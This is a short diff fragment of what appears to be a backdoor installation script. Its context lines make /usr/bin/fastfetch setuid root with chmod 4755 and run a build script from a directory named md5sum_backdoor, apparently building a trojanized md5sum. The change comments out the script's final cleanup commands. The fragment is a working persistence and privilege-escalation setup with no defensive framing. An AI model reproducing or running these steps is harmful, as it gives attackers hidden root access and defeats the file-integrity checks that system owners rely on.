@@ -6,5 +6,5 @@ chmod 4755 /usr/bin/fastfetch
 
 bash ./md5sum_backdoor/build.sh
 
-cd ..
-rm -rf ./my
+# cd ..
+# rm -rf ./my
